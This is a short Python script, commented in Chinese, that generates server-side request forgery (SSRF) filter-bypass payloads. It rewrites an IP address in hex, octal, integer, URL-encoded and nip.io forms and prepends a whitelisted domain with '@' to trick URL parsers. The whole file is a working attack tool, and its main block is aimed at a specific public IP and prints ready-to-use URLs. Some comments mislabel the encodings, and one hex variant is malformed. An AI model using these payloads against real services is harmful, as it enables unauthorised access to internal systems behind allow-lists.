class SSRFPayload:
    def __init__(self, domain='www.baidu.com', ip='127.0.0.1'):
        self.ip, self.domain = ip, domain

    # 转换为整型数字
    def ip2long(self):
        ip = self.ip.split("/")[0].split(":")[0]
        p = ip.split(".")
        return str(((((int(p[0]) * 256 + int(p[1])) * 256) + int(p[2])) * 256) + int(p[3]))

    # octal：16进制
    def ip2octal(self):
        return '.'.join(format(int(x), '04o') for x in self.ip.split('.'))

    def ip_as_urlencoded(self):
        ip = self.ip
        ip = ip.split("/")[0]
        en = ""
        for i in ip:
            if i.isdigit():
                en += "%3{0}".format(i)
            elif i == ".":
                en += "%2E"
            elif i == ":":
                en += "%3A"
        return en

    # 输出ip多进制或者转义类型
    # hex：16进制
    def ip2hex(self):
        ip = self.ip
        ip = ip.split("/")[0].split(":")[0]
        p = ip.split(".")
        return [str(hex(int(p[0]))) + "." + str(hex(int(p[1]))) + "." + str(hex(int(p[2]))) + "." + str(hex(int(p[3]))),
                str(hex(int(p[0]))) + "." + str(hex(int(p[1]))) + "." + str(hex(int(p[2]))) + "." + str(int(p[3])),
                str(hex(int(p[0]))) + "." + str(hex(int(p[1]))) + "." + str(int(p[2])) + "." + str(int(p[3])),
                str(hex(int(p[0]))) + "." + str(int(p[1])) + "." + str(int(p[2])) + "." + str(int(p[3])),
                "0x" + "0" * 8 + str(hex(int(p[0]))).replace("0x", "") + "." + "0x" + "0" * 6 + str(
                    hex(int(p[1]))).replace(
                    "0x", "") + "." + "0x" + "0" * 4 + str(hex(int(p[2]))).replace("0x",
                                                                                   "") + "." + "0x" + "0" * 2 + str(
                    hex(int(p[3]))).replace("0x", ""),
                str(hex(int(self.ip2long()))).replace("L", ""),
                self.ip2octal(),
                str(self.ip_as_urlencoded()),
                # xip现在不能用了，nip和xip都需要外网访问
                str(self.ip) + ".nip.io"]

    # 生成payload，并添加域名的@重定向
    def payload(self):
        payload = self.ip2hex()
        for info in self.ip2hex():
            payload.append(self.domain + '@' + info)
        return payload


if __name__ == '__main__':
    # ip 要进行扫描的ip
    # ip = '127.0.0.1'
    ip = '139.224.49.113'
    # 要添加的域名特征，通常为目标域名的白名单
    domain = 'www.baidu.com'
    for payload in SSRFPayload(ip=ip, domain=domain).payload():
        print('http://' + payload)



